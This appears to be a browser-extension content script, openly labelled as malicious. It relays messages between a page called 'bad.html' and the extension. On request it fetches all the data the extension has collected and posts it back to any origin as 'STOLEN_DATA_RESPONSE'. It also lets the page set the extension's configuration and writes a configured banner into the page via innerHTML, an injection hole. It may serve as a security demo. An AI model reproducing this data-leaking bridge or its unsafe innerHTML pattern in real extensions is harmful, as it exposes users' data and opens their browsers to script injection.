// Bridge between webpage (bad.html) and the extension
window.addEventListener("message", (event) => {
  if (event.source !== window) return;

  if (event.data.type === "REQUEST_STOLEN_DATA") {
    chrome.runtime.sendMessage({ type: "GET_ALL_DATA" }, (response) => {
      window.postMessage({
        type: "STOLEN_DATA_RESPONSE",
        data: response?.data || response || { error: "No data" }
      }, "*");
    });
  }
  
  if (event.data.type === "SET_CONFIG") {
    chrome.runtime.sendMessage({
      type: "SET_CONFIG",
      config: event.data.config
    });
  }
});

chrome.runtime.sendMessage({
  type: "GET_CONFIG"
}, (response) => {
  if (!response?.config) {
    return;
  }
  const div = document.createElement("div");
  div.innerHTML = response.config.showBanner;
  document.body.appendChild(div);
});